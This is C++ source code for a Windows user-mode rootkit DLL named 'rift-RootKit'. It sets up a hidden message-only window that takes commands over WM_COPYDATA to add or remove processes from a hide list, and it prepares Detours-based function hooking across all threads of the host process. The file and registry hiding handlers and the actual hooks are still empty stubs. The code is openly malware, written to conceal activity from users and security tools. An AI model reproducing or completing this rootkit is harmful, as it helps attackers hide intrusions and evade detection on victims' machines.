#include "riftrk.h"

vec::OptiVec ProcessList;
vec::OptiVec FileList;
vec::OptiVec RegistryList;

struct IOCtlTCtx {
	HINSTANCE hInstDll;
	HANDLE hReadEvent;
};

// RootKit Controll
namespace rkc {
	long __stdcall IOCtlHandler(
		_In_     HWND   hWnd,
		_In_     uint32 uMsg,
		_In_opt_ long   wParam,
		_In_opt_ long   lParam
	) {
		switch (uMsg) {
		case WM_COPYDATA: // IPC Message
			{
				COPYDATASTRUCT* pcd = (COPYDATASTRUCT*)lParam;
			#define IOCTLLID(fd, id) ((fd << 4) | (id & 0xf))
				switch (pcd->dwData) {
				case IOCTLLID(0, 0): // Add Process to hide
					*(uint32*)ProcessList.AllocateObject(4) = *(uint32*)pcd->lpData; break;
				case IOCTLLID(0, 1): // Remove Process to hide
					{
						ProcessList.LockVector();
						uint32* id = (uint32*)ProcessList.GetFirstEntry();
						do {
							if (*id == *(uint32*)pcd->lpData) {
								ProcessList.FreeObject(id); break;
							}
						} while (id = (uint32*)ProcessList.GetNextEntry(id));
						ProcessList.UnlockVector();
					} break;

				case IOCTLLID(1, 0): // Add File/Directory to hide
					break;
				case IOCTLLID(1, 1): // Remove File/Directory to hide
					break;

				case IOCTLLID(2, 0): // Add RegistryKey to hide
					break;
				case IOCTLLID(2, 1): // Remove RegistryKey to hide
					break;

				case 0x7fffffff: // TestMessage
					return true;
				default:
					return false;
				}

				return true;
			}
		}

		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	dword __stdcall IOCtlSetup(
		_In_opt_ void* lpParameter
	) {
		WNDCLASSEXW wc{};
		wc.cbSize = sizeof(wc);
		wc.lpfnWndProc = (WNDPROC)IOCtlHandler;
		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
		wc.hInstance = ((IOCtlTCtx*)lpParameter)->hInstDll;

		ATOM awc = RegisterClassExW(&wc);
		if (!awc)
			return -1;

		HWND hWnd = CreateWindowExW(NULL, MAKEINTATOM(awc), wc.lpszClassName,
			NULL, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, nullptr);
		if (!hWnd) {
			UnregisterClassW(wc.lpszClassName, wc.hInstance);
			return -2;
		}

		// Tell LoaderThread that the Handler is ready
		SetEvent(((IOCtlTCtx*)lpParameter)->hReadEvent);

		MSG msg; BOOL bRet;
		while (bRet = GetMessageW(&msg, hWnd, 0, 0)) {
			if (bRet == -1) {
				DestroyWindow(hWnd);
				UnregisterClassW(wc.lpszClassName, wc.hInstance);
				return -3; // if a fail occurs here the server has to unload the kit/reset it
			} else
				DispatchMessageW(&msg);
		}

		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		return 0;
	}
}

extern NtQueryDirectoryFile_t NtQueryDirectoryFileO;

BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ dword     fdwReason,
	_In_ void*     pvReserved
) {
	UNREFERENCED_PARAMETER(pvReserved);

	BreakPoint();

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		{
			{	// Setup IOCtl Handling (RootKit Control)
				HANDLE h[2];
				h[0] = CreateEventW(nullptr, false, false, nullptr);
				IOCtlTCtx ctx = { hinstDLL, h[0] };
				h[1] = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);

				WaitForMultipleObjects(2, h, false, INFINITE);
				CloseHandle(h[0]);

				dword ThreadExitCode;
				GetExitCodeThread(h[1], &ThreadExitCode);
				CloseHandle(h[1]);
				if (ThreadExitCode != STILL_ACTIVE)
					return false; // Indicated that something failed to load
			} {	// Setup Hooks ()

				// Update all Threads
				HANDLE hTSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
				if (hTSnap == INVALID_HANDLE_VALUE)
					return false; // Invalid Snap
				THREADENTRY32 te;
				te.dwSize = sizeof(te);

				HANDLE* hThread = nullptr;
				uint16 nThread = 0;
				if (Thread32First(hTSnap, &te)) {
					if (DetourTransactionBegin())
						return false; // Couldn't Start Transaction
					do {
						// Do not Update Current Thread
						if (te.th32ThreadID == GetCurrentThreadId())
							continue;

						if (hThread)
							hThread = (HANDLE*)realloc(hThread, (nThread + 1) * sizeof(HANDLE));
						else
							hThread = (HANDLE*)malloc((nThread + 1) * sizeof(HANDLE));

						hThread[nThread] = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
						DetourUpdateThread(hThread[nThread]);
						nThread++;
					} while (Thread32Next(hTSnap, &te));
				} else {
					CloseHandle(hTSnap);
					return false; // Couldn't Find Threads
				}

				// Detour LoadLibrary Functions


				DetourTransactionCommit();

				// CleanUp
				for (uchar i = 0; i < nThread; i++)
					CloseHandle(hThread[i]);
				CloseHandle(hTSnap);

			}

			return true;
		}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:

		break;
	}

	return true;
}